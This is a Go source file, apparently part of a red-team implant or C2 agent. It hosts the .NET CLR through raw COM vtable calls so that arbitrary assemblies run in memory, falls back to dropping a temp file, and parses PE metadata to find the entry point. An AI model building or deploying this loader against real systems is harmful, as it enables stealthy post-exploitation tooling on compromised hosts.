func executeViaFilePath(pRuntimeInfo uintptr, asmBytes []byte, args, typeName, methodName string) (string, error) {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getTempPath := k32.NewProc("GetTempPathW")
	getTempFile := k32.NewProc("GetTempFileNameW")

	var tmpDir [260]uint16
	getTempPath.Call(260, uintptr(unsafe.Pointer(&tmpDir[0])))
	prefix, _ := windows.UTF16PtrFromString("svc")
	var tmpPath [260]uint16
	getTempFile.Call(uintptr(unsafe.Pointer(&tmpDir[0])), uintptr(unsafe.Pointer(prefix)), 0, uintptr(unsafe.Pointer(&tmpPath[0])))

	path := windows.UTF16ToString(tmpPath[:])

	// Write assembly bytes to temp file
	h, err := windows.CreateFile(
		&tmpPath[0],
		windows.GENERIC_WRITE, 0, nil,
		windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0,
	)
	if err != nil {
		return "", fmt.Errorf("create temp file: %w", err)
	}
	var written uint32
	windows.WriteFile(h, asmBytes, &written, nil)
	windows.CloseHandle(h)
	defer windows.DeleteFile(&tmpPath[0]) //nolint:errcheck

	// ICLRRuntimeHost
	var pHost uintptr
	if _, err := clrVtblCall(pRuntimeInfo, 9,
		uintptr(unsafe.Pointer(&clsidCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pHost)),
	); err != nil {
		return "", fmt.Errorf("GetInterface(ICLRRuntimeHost): %w", err)
	}
	if hr, _ := clrVtblCall(pHost, 3); hr != 0 && hr != 1 {
		return "", fmt.Errorf("Start: HRESULT 0x%08X", hr)
	}

	pathW, _ := windows.UTF16PtrFromString(path)
	typeW, _ := windows.UTF16PtrFromString(typeName)
	methW, _ := windows.UTF16PtrFromString(methodName)
	argsW, _ := windows.UTF16PtrFromString(args)
	var retVal uint32
	// ICLRRuntimeHost vtable: Start=3, Stop=4, SetHostControl=5, GetCLRControl=6,
	// UnloadAppDomain=7, ExecuteInAppDomain=8, GetCurrentAppDomainId=9,
	// ExecuteApplication=10, ExecuteInDefaultAppDomain=11
	clrVtblCall(pHost, 11, //nolint:errcheck
		uintptr(unsafe.Pointer(pathW)),
		uintptr(unsafe.Pointer(typeW)),
		uintptr(unsafe.Pointer(methW)),
		uintptr(unsafe.Pointer(argsW)),
		uintptr(unsafe.Pointer(&retVal)),
	)
	return "", nil
}

// ── Main exported function ────────────────────────────────────────────────────

// ExecuteAssembly runs a .NET assembly in-process.
// Primary path: loads from memory via ICorRuntimeHost + AppDomain.Load_3 (no disk write).
// Fallback: drops to a temp file and calls ExecuteInDefaultAppDomain.
//
// Args semantics: space-split and passed as string[] to the entry point.
// typeName/methodName are only used by the file-based fallback path.
// Execution is bounded by a 3-minute hard timeout.
func ExecuteAssembly(asmBytes []byte, args, typeName, methodName string) (string, error) {
	// Serialize CLR access — concurrent Invoke_3 calls corrupt the Console.Out pipe redirect.
	clrMu.Lock()
	defer clrMu.Unlock()

	type result struct {
		out string
		err error
	}
	ch := make(chan result, 1)
	progress := make(chan string, 20) // diagnostic progress markers
	var lastProg string

	go func() {
		o, e := executeAssemblyInner(asmBytes, args, typeName, methodName, progress)
		close(progress)
		ch <- result{o, e}
	}()

	// 3-minute hard timeout
	timer := time.NewTimer(3 * 60 * time.Second)
	defer timer.Stop()
	for {
		select {
		case p, ok := <-progress:
			if ok {
				lastProg = p
			}
		case r := <-ch:
			return r.out, r.err
		case <-timer.C:
			return fmt.Sprintf("[!] dotnet-exec timeout (3 min), last step: %s", lastProg), nil
		}
	}
}

func executeAssemblyInner(asmBytes []byte, args, typeName, methodName string, progress chan<- string) (string, error) {
	progress <- "redirectStdio"
	// Redirect stdout/stderr to a temp file.
	// File-based capture avoids anonymous-pipe EOF signalling: Console.SetOut wraps
	// the file handle in a .NET FileStream (ownsHandle=false), so no extra write-end
	// references are created that would block EOF detection. After the assembly runs
	// we simply seek to 0 and read the file content — no drainer goroutine needed.
	outH, tmpPathW, restore, err := redirectStdioFile()
	if err != nil {
		return "", fmt.Errorf("redirectStdioFile: %w", err)
	}
	defer func() {
		windows.CloseHandle(outH)
		windows.DeleteFile(tmpPathW) //nolint:errcheck
	}()

	progress <- "bootstrapCLR"
	// Bootstrap CLR
	pMetaHost, pRuntimeInfo, err := bootstrapCLR()
	_ = pMetaHost
	if err != nil {
		return "", err
	}

	// Write a sentinel directly to outH to verify the handle is writable.
	var sentinelN uint32
	sentinelErr := windows.WriteFile(outH, []byte("[pipe:ok]\n"), &sentinelN, nil)

	progress <- "executeInMemory"
	clrDiag, execErr := executeInMemory(pRuntimeInfo, asmBytes, args, progress, outH)

	// Flush any buffered Console.Out/Error data before restoring handles.
	// creset6's StreamWriter has AutoFlush=true so this is belt-and-suspenders,
	// but also flushes the underlying OS buffer.
	progress <- "flushConsole"
	consoleFlushOutput(pRuntimeInfo, nil)

	progress <- "restoring"
	restore()

	// Read all captured output from the temp file (sentinel + Console.Write bytes).
	progress <- "reading_output"
	windows.SetFilePointer(outH, 0, nil, windows.FILE_BEGIN)
	outBuf := make([]byte, 262144) // 256 KB max
	var nr uint32
	windows.ReadFile(outH, outBuf, &nr, nil)
	rawOut := string(outBuf[:nr])

	// Strip internal markers from the captured output; keep only assembly output.
	var userOut strings.Builder
	for _, line := range strings.Split(rawOut, "\n") {
		stripped := strings.TrimRight(line, "\r")
		if stripped == "[pipe:ok]" || stripped == "[post_invoke]" ||
			strings.HasPrefix(stripped, "[creset:") ||
			strings.HasPrefix(stripped, "[d:") {
			continue
		}
		userOut.WriteString(line)
		userOut.WriteByte('\n')
	}
	pipeOut := strings.TrimRight(userOut.String(), "\n")

	var sb strings.Builder
	if pipeOut != "" {
		sb.WriteString(pipeOut)
		sb.WriteByte('\n')
	} else if execErr == nil {
		sb.WriteString("[+] assembly executed (no console output)\n")
	}
	if execErr != nil {
		// Include CLR diag on error to aid debugging
		if clrDiag != "" {
			sb.WriteString(clrDiag)
		}
		sb.WriteString(fmt.Sprintf("[!] CLR exec error: %v\n", execErr))
	}
	_ = sentinelN
	_ = sentinelErr
	return sb.String(), nil
}

// ── PE metadata parser (unchanged) ───────────────────────────────────────────

func netEntryPoint(pe []byte) (typeName, methodName string) {
	safe := func(off, n int) bool { return off >= 0 && off+n <= len(pe) }
	read16 := func(off int) uint16 {
		if !safe(off, 2) {
			return 0
		}
		return binary.LittleEndian.Uint16(pe[off:])
	}
	read32 := func(off int) uint32 {
		if !safe(off, 4) {
			return 0
		}
		return binary.LittleEndian.Uint32(pe[off:])
	}
	read64 := func(off int) uint64 {
		if !safe(off, 8) {
			return 0
		}
		return binary.LittleEndian.Uint64(pe[off:])
	}

	if !safe(0, 4) || pe[0] != 'M' || pe[1] != 'Z' {
		return "", ""
	}
	peOff := int(read32(0x3c))
	if !safe(peOff, 4) || pe[peOff] != 'P' || pe[peOff+1] != 'E' {
		return "", ""
	}

	coffOff := peOff + 4
	numSections := int(read16(coffOff + 2))
	optHdrOff := coffOff + 20
	magic := read16(optHdrOff)
	var ddTableOff int
	switch magic {
	case 0x10b:
		ddTableOff = optHdrOff + 96
	case 0x20b:
		ddTableOff = optHdrOff + 112
	default:
		return "", ""
	}
	var optHdrSize int
	if magic == 0x10b {
		optHdrSize = 224
	} else {
		optHdrSize = 240
	}
	sectionOff := optHdrOff + optHdrSize

	rvaToOff := func(rva uint32) int {
		for i := 0; i < numSections; i++ {
			sh := sectionOff + i*40
			if !safe(sh, 40) {
				break
			}
			vAddr := read32(sh + 12)
			vSize := read32(sh + 8)
			rawOff := read32(sh + 20)
			if rva >= vAddr && rva < vAddr+vSize {
				return int(rawOff + rva - vAddr)
			}
		}
		return -1
	}

	comDirOff := ddTableOff + 14*8
	comRVA := read32(comDirOff)
	if comRVA == 0 {
		return "", ""
	}
	comOff := rvaToOff(comRVA)
	if comOff < 0 || !safe(comOff, 24) {
		return "", ""
	}

	metaRVA := read32(comOff + 8)
	flags := read32(comOff + 16)
	epToken := read32(comOff + 20)

	if flags&0x10 != 0 {
		return "", ""
	}
	if epToken>>24 != 0x06 {
		return "", ""
	}
	epRow := int(epToken & 0x00FFFFFF)

	metaOff := rvaToOff(metaRVA)
	if metaOff < 0 || !safe(metaOff, 20) {
		return "", ""
	}
	if pe[metaOff] != 'B' || pe[metaOff+1] != 'S' || pe[metaOff+2] != 'J' || pe[metaOff+3] != 'B' {
		return "", ""
	}

	vLen := int(read32(metaOff + 12))
	vLen = (vLen + 3) &^ 3
	numStreams := int(read16(metaOff + 16 + vLen + 2))
	shOff := metaOff + 16 + vLen + 4

	var tablesStreamOff, stringsStreamOff int
	for i := 0; i < numStreams && safe(shOff, 8); i++ {
		sOffset := int(read32(shOff))
		nameOff := shOff + 8
		end := nameOff
		for end < len(pe) && pe[end] != 0 {
			end++
		}
		name := string(pe[nameOff:end])
		padded := ((end - nameOff + 1) + 3) &^ 3
		shOff = nameOff + padded
		switch name {
		case "#~":
			tablesStreamOff = metaOff + sOffset
		case "#Strings":
			stringsStreamOff = metaOff + sOffset
		}
	}
	if tablesStreamOff == 0 || stringsStreamOff == 0 {
		return "", ""
	}

	heapSizes := pe[tablesStreamOff+6]
	strIdxW := 2
	if heapSizes&1 != 0 {
		strIdxW = 4
	}
	blobIdxW := 2
	if heapSizes&4 != 0 {
		blobIdxW = 4
	}
	guidIdxW := 2
	if heapSizes&2 != 0 {
		guidIdxW = 4
	}
	_ = guidIdxW

	valid := read64(tablesStreamOff + 8)
	rowCountOff := tablesStreamOff + 24
	rowCount := map[int]int{}
	for b := 0; b < 64; b++ {
		if valid&(1<<uint(b)) != 0 {
			if safe(rowCountOff, 4) {
				rowCount[b] = int(read32(rowCountOff))
				rowCountOff += 4
			}
		}
	}
	tableDataOff := rowCountOff

	tdOrRefN := maxN(rowCount[0x00], rowCount[0x01], rowCount[0x02], rowCount[0x1b])
	typeDefOrRefW := 2
	if tdOrRefN > (0xFFFF >> 2) {
		typeDefOrRefW = 4
	}
	fieldListW := 2
	if rowCount[0x04] > 0xFFFF {
		fieldListW = 4
	}
	methodListW := 2
	if rowCount[0x06] > 0xFFFF {
		methodListW = 4
	}
	paramListW := 2
	if rowCount[0x08] > 0xFFFF {
		paramListW = 4
	}

	moduleSz := 2 + strIdxW + guidIdxW + guidIdxW + guidIdxW
	typeRefSz := typeDefOrRefW + strIdxW + strIdxW
	typeDefSz := 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW + methodListW
	fieldSz := 2 + strIdxW + blobIdxW
	methodDefSz := 4 + 2 + 2 + strIdxW + blobIdxW + paramListW

	cur := tableDataOff
	tableStart := map[int]int{}
	for _, tbl := range []int{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06} {
		tableStart[tbl] = cur
		sz := map[int]int{
			0x00: moduleSz, 0x01: typeRefSz, 0x02: typeDefSz,
			0x03: 0, 0x04: fieldSz, 0x05: 0, 0x06: methodDefSz,
		}[tbl]
		if n, ok := rowCount[tbl]; ok && n > 0 {
			cur += n * sz
		}
	}

	methodDefBase := tableStart[0x06]
	typeDefBase := tableStart[0x02]

	if epRow < 1 || epRow > rowCount[0x06] {
		return "", ""
	}

	mdRowOff := methodDefBase + (epRow-1)*methodDefSz
	if !safe(mdRowOff, methodDefSz) {
		return "", ""
	}
	var mdNameIdx uint32
	if strIdxW == 2 {
		mdNameIdx = uint32(read16(mdRowOff + 8))
	} else {
		mdNameIdx = read32(mdRowOff + 8)
	}

	var ownerNameIdx, ownerNsIdx uint32
	for row := 0; row < rowCount[0x02]; row++ {
		tdOff := typeDefBase + row*typeDefSz
		if !safe(tdOff, typeDefSz) {
			break
		}
		mlColOff := tdOff + 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW
		var methodListStart int
		if methodListW == 2 {
			methodListStart = int(read16(mlColOff))
		} else {
			methodListStart = int(read32(mlColOff))
		}
		var methodListEnd int
		if row+1 < rowCount[0x02] {
			nextTdOff := typeDefBase + (row+1)*typeDefSz
			if safe(nextTdOff, typeDefSz) {
				mlColOff2 := nextTdOff + 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW
				if methodListW == 2 {
					methodListEnd = int(read16(mlColOff2))
				} else {
					methodListEnd = int(read32(mlColOff2))
				}
			}
		} else {
			methodListEnd = rowCount[0x06] + 1
		}
		if epRow >= methodListStart && epRow < methodListEnd {
			if strIdxW == 2 {
				ownerNameIdx = uint32(read16(tdOff + 4))
				ownerNsIdx = uint32(read16(tdOff + 4 + strIdxW))
			} else {
				ownerNameIdx = read32(tdOff + 4)
				ownerNsIdx = read32(tdOff + 4 + strIdxW)
			}
			break
		}
	}

	strAt := func(idx uint32) string {
		off := stringsStreamOff + int(idx)
		if !safe(off, 1) {
			return ""
		}
		end := off
		for end < len(pe) && pe[end] != 0 {
			end++
		}
		return string(pe[off:end])
	}

	mName := strAt(mdNameIdx)
	tName := strAt(ownerNameIdx)
	ns := strAt(ownerNsIdx)
	if ns != "" {
		tName = ns + "." + tName
	}
	return tName, mName
}

func maxN(vals ...int) int {
	m := 0
	for _, v := range vals {
		if v > m {
			m = v
		}
	}
	return m
}
